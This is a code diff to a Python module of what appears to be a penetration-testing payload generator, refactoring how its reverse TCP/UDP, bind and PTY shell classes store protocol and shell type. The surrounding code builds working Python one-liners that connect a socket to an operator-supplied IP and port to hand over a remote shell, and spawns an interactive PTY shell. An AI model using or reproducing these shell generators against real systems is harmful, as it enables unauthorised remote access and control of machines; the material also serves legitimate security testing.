@@ -33,11 +33,12 @@ class ReverseTCP(plugin.ReverseShell):
         self.set_write_file()
         self.opts.description = "[ReverseShell][TCP] Python from swisskyrepo/PayloadsAllTheThings. License MIT."
         self.opts.description += "\nModule author: Nguyen Hoang Thanh <smith.nguyenhoangthanh@gmail.com>"
-        self.shell_type = "tcp"
+        self.protocol = "tcp"
+        self.shell_type = 1
 
     def make_shell(self):
         self.shell = f"""{self.args.type} -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,"""
-        if self.shell_type == "udp":
+        if self.protocol == "udp":
             self.shell += f"""socket.SOCK_DGRAM);s.connect(("{self.args.ip}",{self.args.port}));"""
         else:
             self.shell += f"""socket.SOCK_STREAM);s.connect(("{self.args.ip}",{self.args.port}));"""
@@ -69,7 +70,6 @@ class PTY(plugin.BaseShell):
         )
         self.opts.description = "[PTYShell] Python PTY shell escape from https://netsec.ws/?p=337"
         self.opts.description += "\nModule author: Nong Hoang Tu <dmknght@parrotsec.org>"
-        self.shell_type = "pty"
 
     def make_shell(self):
         self.shell = f"""{self.args.type} -c 'import pty; pty.spawn("{self.args.shell}")'"""
@@ -78,7 +78,8 @@ class PTY(plugin.BaseShell):
 class ReverseUDP(ReverseTCP):
     def __init__(self):
         super().__init__()
-        self.shell_type = "udp"
+        self.protocol = "udp"
+        self.shell_type = 1
         self.opts.description = "[ReverseShell][UDP] Generic shells from swisskyrepo/PayloadsAllTheThings. License MIT."
 
 
@@ -115,7 +116,7 @@ class BindTCP(plugin.BindShell):
         self.opts.description += "\nModule author: Nguyen Hoang Thanh <smith.nguyenhoangthanh@gmail.com>"
         self.set_write_file()
         self.protocol = "tcp"
-        self.shell_type = 0
+        self.shell_type = 2
         self.is_interactive = True
 
     def make_shell(self):
@@ -141,7 +142,7 @@ class BindTCP(plugin.BindShell):
 class BindUDP(BindTCP):
     def __init__(self):
         super().__init__()
-        self.shell_type = "udp"
+        self.protocol = "udp"
         self.opts.description = "[BindShell][UDP] Python from swisskyrepo/PayloadsAllTheThings. License MIT."
 
     def make_shell(self):
